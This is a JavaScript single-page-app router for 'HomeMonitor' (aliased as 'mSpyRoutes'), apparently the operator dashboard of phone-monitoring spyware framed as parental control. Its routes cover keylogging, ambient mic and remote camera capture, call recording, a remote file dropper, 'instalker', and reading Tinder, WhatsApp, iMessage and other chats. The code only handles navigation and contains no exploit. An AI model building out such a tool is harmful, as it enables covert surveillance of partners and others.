// routes.js - Dual-Portal SPA Router with Clean HTML5 URLs & Superadmin Role Guards
const homeMonitorRoutes = {
    // MASTER SUPER ADMIN PORTAL ROUTES
    "/superadmin": { tabId: "tab-superadmin-portal", title: "Master Super Admin Command Portal", category: "System Administration" },
    "/superadmin/remote-control": { tabId: "tab-superadmin-remote-control", title: "Interactive Remote Control Panel", category: "System Administration" },

    // PRIMARY PARENT ROUTES
    "/": { tabId: "tab-dashboard-overview", title: "Home Overview", category: "Family Management" },
    "/dashboard": { tabId: "tab-dashboard-overview", title: "Home Overview", category: "Family Management" },
    "/devices": { tabId: "tab-device-info", title: "Monitored Family Devices", category: "Family Management" },
    "/location": { tabId: "tab-gps-locations", title: "Location & Safe Zones", category: "Family Management" },
    "/screentime": { tabId: "tab-installed-apps", title: "Screen Time & Applications", category: "Family Management" },
    "/activity": { tabId: "tab-notifications", title: "Family Activity Feed", category: "Family Management" },
    "/safety": { tabId: "tab-mdm-security", title: "Safety Settings & Controls", category: "Family Management" },
    "/settings": { tabId: "tab-parent-settings", title: "Account & Security Settings", category: "Family Management" },
    "/help": { tabId: "tab-help-center", title: "Parent Help & Support Center", category: "Family Management" },

    // SUB-FEATURE ALIASES & DETAILED ROUTING
    "/deviceinfo": { tabId: "tab-device-info", title: "Monitored Devices", category: "Family Management" },
    "/surroundings_recording": { tabId: "tab-ambient-mic", title: "Surroundings Recording", category: "Device Monitoring" },
    "/remote_camera": { tabId: "tab-camera-studio", title: "Remote Camera Studio", category: "Device Monitoring" },
    "/call_recording": { tabId: "tab-calls", title: "Call History & Recordings", category: "Device Monitoring" },
    "/live_screenshot": { tabId: "tab-screenrecorder", title: "Live Screenshots", category: "Device Monitoring" },
    "/live_screen_streaming": { tabId: "tab-webstream", title: "WebStream Screen Stream", category: "Device Monitoring" },

    // RESTRICTIONS & CONTROLS
    "/block_app": { tabId: "tab-mdm-security", title: "Parental Safety Controls", category: "Restrictions" },
    "/block_website": { tabId: "tab-browser-history", title: "Browser Search History", category: "Restrictions" },
    "/block_wifi": { tabId: "tab-device-info", title: "Wi-Fi & Network Specs", category: "Restrictions" },

    // AI CHATBOT STREAMS
    "/chat_gpt": { tabId: "tab-social-chat", socialApp: "chatgpt", title: "ChatGPT Activity Stream", category: "AI Tools" },
    "/gemini": { tabId: "tab-social-chat", socialApp: "gemini", title: "Google Gemini Activity Stream", category: "AI Tools" },

    // BEHAVIOR MONITORING
    "/activity_timeline": { tabId: "tab-dashboard-overview", title: "Activity Timeline", category: "Behavior Monitoring" },
    "/key_logger_app": { tabId: "tab-keylogger", title: "Keystroke Activity Stream", category: "Behavior Monitoring" },
    "/keyword_rule": { tabId: "tab-master-admin", title: "Keyword Safety Alerts & Admin", category: "Behavior Monitoring" },
    "/notifications": { tabId: "tab-notifications", title: "Family Activity Feed", category: "Behavior Monitoring" },

    // GENERAL FEATURES
    "/call": { tabId: "tab-calls", title: "Call History & Logs", category: "General Features" },
    "/contact": { tabId: "tab-contacts", title: "Address Book Contacts", category: "General Features" },
    "/browser_history": { tabId: "tab-browser-history", title: "Browser Search Activity", category: "General Features" },
    "/browser_bookmark": { tabId: "tab-browser-history", title: "Browser Bookmarks", category: "General Features" },
    "/application": { tabId: "tab-installed-apps", title: "Screen Time & Applications", category: "General Features" },
    "/file_explorer": { tabId: "tab-file-explorer", title: "Device Storage Files", category: "General Features" },
    "/files": { tabId: "tab-file-explorer", title: "Device Storage Files", category: "General Features" },
    "/file_dropper": { tabId: "tab-file-dropper", title: "Remote File Dropper", category: "General Features" },
    "/event": { tabId: "tab-dashboard-overview", title: "Calendar Events", category: "General Features" },

    // MESSAGING & SOCIAL FEEDS
    "/screenrecorder_pages": { tabId: "tab-screenrecorder", title: "Screen Captures", category: "Messaging Monitoring" },
    "/sms_chat": { tabId: "tab-sms-messages", title: "SMS Text Messages", category: "Messaging Monitoring" },
    "/email": { tabId: "tab-sms-messages", title: "Email Inbox Viewer", category: "Messaging Monitoring" },
    "/whatsapp_chat": { tabId: "tab-social-chat", socialApp: "whatsapp", title: "WhatsApp Messages", category: "Social Networks" },
    "/facebook_messages_chat": { tabId: "tab-social-chat", socialApp: "facebook", title: "Facebook Messenger", category: "Social Networks" },
    "/instagram_chat": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instagram Direct Messages", category: "Social Networks" },
    "/snapchat_chat": { tabId: "tab-social-chat", socialApp: "snapchat", title: "Snapchat Messages", category: "Social Networks" },
    "/tinder_chat": { tabId: "tab-social-chat", socialApp: "tinder", title: "Tinder Messages", category: "Social Networks" },
    "/tiktok_chat": { tabId: "tab-social-chat", socialApp: "tiktok", title: "TikTok Direct Messages", category: "Social Networks" },
    "/telegram_chat": { tabId: "tab-social-chat", socialApp: "telegram", title: "Telegram Messages", category: "Social Networks" },
    "/viber_chat": { tabId: "tab-social-chat", socialApp: "viber", title: "Viber Messenger", category: "Social Networks" },
    "/discord_chat": { tabId: "tab-social-chat", socialApp: "discord", title: "Discord Direct Messages", category: "Social Networks" },
    "/line_chat": { tabId: "tab-social-chat", socialApp: "line", title: "LINE Chat Messages", category: "Social Networks" },
    "/kik_chat": { tabId: "tab-social-chat", socialApp: "kik", title: "Kik Messenger", category: "Social Networks" },
    "/imessage_chat": { tabId: "tab-social-chat", socialApp: "imessage", title: "iMessage Conversations", category: "Social Networks" },

    // MEDIA & LOCATION ALIASES
    "/photo": { tabId: "tab-photos", title: "Photos Gallery", category: "Media" },
    "/video": { tabId: "tab-videos", title: "Videos Library", category: "Media" },
    "/geofencing_area": { tabId: "tab-geofencing", title: "Safe Zones & Geofences", category: "Location" },
    "/wifi": { tabId: "tab-firebase-pool", title: "Account Pool & Backup", category: "Location" },
    "/instalker": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instagram Activity", category: "Location" },
    "/location_by_link": { tabId: "tab-gps-locations", title: "GPS Location Tracking", category: "Location" }
};

// Backwards-compatibility alias
const mSpyRoutes = homeMonitorRoutes;

function navigateToRoute(rawPath, updateHistory = true) {
    // Normalize path (handle clean HTML5 path or legacy hash path)
    let cleanPath = rawPath || "/dashboard";
    if (cleanPath.startsWith("#")) cleanPath = cleanPath.substring(1);
    if (!cleanPath.startsWith("/")) cleanPath = "/" + cleanPath;

    // 1. Enforce Authentication Guard (Fail-Closed)
    if (typeof currentAuthState !== "undefined" && currentAuthState !== AUTH_STATES.AUTHENTICATED) {
        console.warn(`[Route Guard] Blocked unauthenticated route attempt to '${cleanPath}'`);
        return;
    }

    // 2. Enforce Master Super Admin Role Guard
    if (cleanPath.startsWith("/superadmin") || cleanPath === "/keyword_rule") {
        if (typeof isMasterAdmin !== "undefined" && !isMasterAdmin) {
            console.warn(`[Route Guard] Blocked non-admin user '${currentUser ? currentUser.email : "unknown"}' from accessing Super Admin route '${cleanPath}'`);
            if (typeof showDashboardNotification === "function") {
                showDashboardNotification("error", "Access Denied: Master Super Admin authorization required.");
            }
            navigateToRoute("/dashboard", true);
            return;
        }
    }

    const route = homeMonitorRoutes[cleanPath] || homeMonitorRoutes["/dashboard"];

    // Update document title dynamically
    document.title = `HomeMonitor — ${route.title}`;

    console.log(`[Router] Navigating to '${cleanPath}' -> Tab '${route.tabId}' (${route.title})`);

    // Update URL bar via clean HTML5 History API or Hash fallback
    if (updateHistory) {
        try {
            if (window.location.pathname !== cleanPath) {
                window.history.pushState({ route: cleanPath }, "", cleanPath);
            }
            if (window.location.hash !== `#${cleanPath}`) {
                window.location.hash = cleanPath;
            }
        } catch (_) {
            window.location.hash = cleanPath;
        }
    }

    // Highlight active link in sidebar
    document.querySelectorAll(".nav-link").forEach(l => l.classList.remove("active"));
    const activeBtn = document.querySelector(`.nav-link[data-route="${cleanPath}"]`);
    if (activeBtn) activeBtn.classList.add("active");

    // Hide all tab panels
    document.querySelectorAll(".tab-panel").forEach(panel => panel.classList.add("d-none"));

    // Handle Master Super Admin Control Center views
    if (cleanPath === "/superadmin/remote-control" || route.tabId === "tab-superadmin-remote-control") {
        const rcPanel = document.getElementById("tab-superadmin-remote-control");
        if (rcPanel) {
            rcPanel.classList.remove("d-none");
            if (typeof renderSuperAdminRemoteControl === "function") {
                renderSuperAdminRemoteControl();
            }
        }
        return;
    }

    if (cleanPath === "/superadmin" || route.tabId === "tab-superadmin-portal") {
        const superadminPanel = document.getElementById("tab-superadmin-portal");
        if (superadminPanel) {
            superadminPanel.classList.remove("d-none");
            if (typeof renderSuperAdminPortal === "function") {
                renderSuperAdminPortal();
            }
        }
        return;
    }

    // Handle 3-column social chat routing
    if (route.tabId === "tab-social-chat" && route.socialApp) {
        const socialPanel = document.getElementById("tab-social-chat");
        if (socialPanel) {
            socialPanel.classList.remove("d-none");
            if (typeof loadSocialAppConversation === "function") {
                loadSocialAppConversation(route.socialApp, route.title);
            }
        }
        return;
    }

    // Handle normal parent tab panels
    const targetPanel = document.getElementById(route.tabId);
    if (targetPanel) {
        targetPanel.classList.remove("d-none");
        const categoryKey = route.tabId.replace("tab-", "").replace(/-/g, "_");
        if (typeof fetchCategoryTelemetryLogs === "function" && route.tabId !== "tab-dashboard-overview" && route.tabId !== "tab-master-admin" && route.tabId !== "tab-parent-settings" && route.tabId !== "tab-help-center") {
            fetchCategoryTelemetryLogs(categoryKey);
        }
    } else {
        const genericPanel = document.getElementById("tab-generic");
        if (genericPanel) {
            const titleEl = document.getElementById("genericTabTitle");
            if (titleEl) titleEl.innerText = route.title;
            genericPanel.classList.remove("d-none");
            if (typeof fetchCategoryTelemetryLogs === "function") {
                fetchCategoryTelemetryLogs(route.tabId);
            }
        }
    }
}

// Handle Browser Navigation Events (Popstate & Hashchange)
window.addEventListener("popstate", function(event) {
    if (typeof currentAuthState !== "undefined" && currentAuthState === AUTH_STATES.AUTHENTICATED) {
        const path = window.location.pathname || (window.location.hash ? window.location.hash.replace("#", "") : "/dashboard");
        if (homeMonitorRoutes[path]) {
            navigateToRoute(path, false);
        } else {
            navigateToRoute("/dashboard", false);
        }
    }
});

window.addEventListener("hashchange", function() {
    if (typeof currentAuthState !== "undefined" && currentAuthState === AUTH_STATES.AUTHENTICATED) {
        const currentHash = window.location.hash.replace("#", "");
        if (currentHash && homeMonitorRoutes[currentHash]) {
            navigateToRoute(currentHash, false);
        }
    }
});
